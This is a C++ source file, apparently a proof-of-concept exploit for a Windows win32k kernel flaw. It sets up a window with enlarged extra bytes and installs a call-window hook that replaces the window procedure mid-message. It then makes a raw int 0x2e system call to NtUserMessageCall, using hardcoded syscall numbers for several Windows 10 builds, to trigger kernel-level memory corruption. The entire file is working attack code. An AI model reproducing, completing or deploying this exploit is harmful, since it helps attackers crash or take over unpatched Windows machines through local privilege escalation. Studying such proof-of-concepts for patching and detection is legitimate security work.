// PoC_Win32k.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <Windows.h>
#include <iostream>

DWORD MessageCallAPI = 0x135a; //0x11ce (1809, 1903, 1909)


extern "C"
ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
	__asm {mov eax, ApiNumber};
	__asm {lea edx, ApiNumber + 4};
	__asm {int 0x2e};
}

HHOOK hookWnd = NULL;
wchar_t className[] = L"Class";
HWND Globalhwnd;



LRESULT CALLBACK DlgProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	int res = 0;

	res = SetWindowLongPtrA(hwnd, DWLP_USER, 0x6);

	return DefDlgProcA(hwnd, msg, wParam, lParam);
}


static LRESULT CALLBACK xxWindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
{
	tagCWPSTRUCT *cwp = (tagCWPSTRUCT *)lParam;
	int res = 0;

	if (cwp->message == WM_WINDOWPOSCHANGED)
	{
		res = SetWindowLongA(Globalhwnd, GWLP_WNDPROC, (LONG)DlgProc);
		res = SystemCall32(MessageCallAPI, Globalhwnd, WM_SIZE, 0, 0, 0, 0x0, 1); //_NtUserMessageCall
	}

	return CallNextHookEx(0, code, wParam, lParam);
}


bool setHookingApp()
{
	printf("Estableciendo hooking");
	bool bReturn = false;
	try
	{
		//WH_CALLWNDPROC

		if (!hookWnd)
		{
			hookWnd = SetWindowsHookEx(WH_CALLWNDPROC,
				&xxWindowHookProc, GetModuleHandle(NULL), GetCurrentThreadId());

			if (hookWnd == NULL)
				printf("Failed to hook xxWindowHookProc");
		}

	}
	catch (...)
	{
		bReturn = false;
	}

	return bReturn;

}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	int res = 0;

	if (msg == WM_GETMINMAXINFO)
	{
		Globalhwnd = hwnd;
		res = AnimateWindow(hwnd, 3, 8);

	}

	if (msg == WM_WINDOWPOSCHANGING)
	{
		setHookingApp();
	}

	return DefWindowProc(hwnd, msg, wParam, lParam);
}

int main()
{
    //Registro clase

	WNDCLASSEX wc;
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0x29; //0xa
	wc.hInstance = GetModuleHandle(0);
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;
	wc.lpszClassName = className;
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassEx(&wc))
	{
		printf("Class Registration Failed!");
		return false;
	}

	//creandoClase
	HWND Globalhwnd2 = CreateWindowW(className, NULL, WS_OVERLAPPEDWINDOW | WS_SYSMENU, 0, 0, 0, 0, NULL, NULL, NULL, NULL);


	return 0;
}

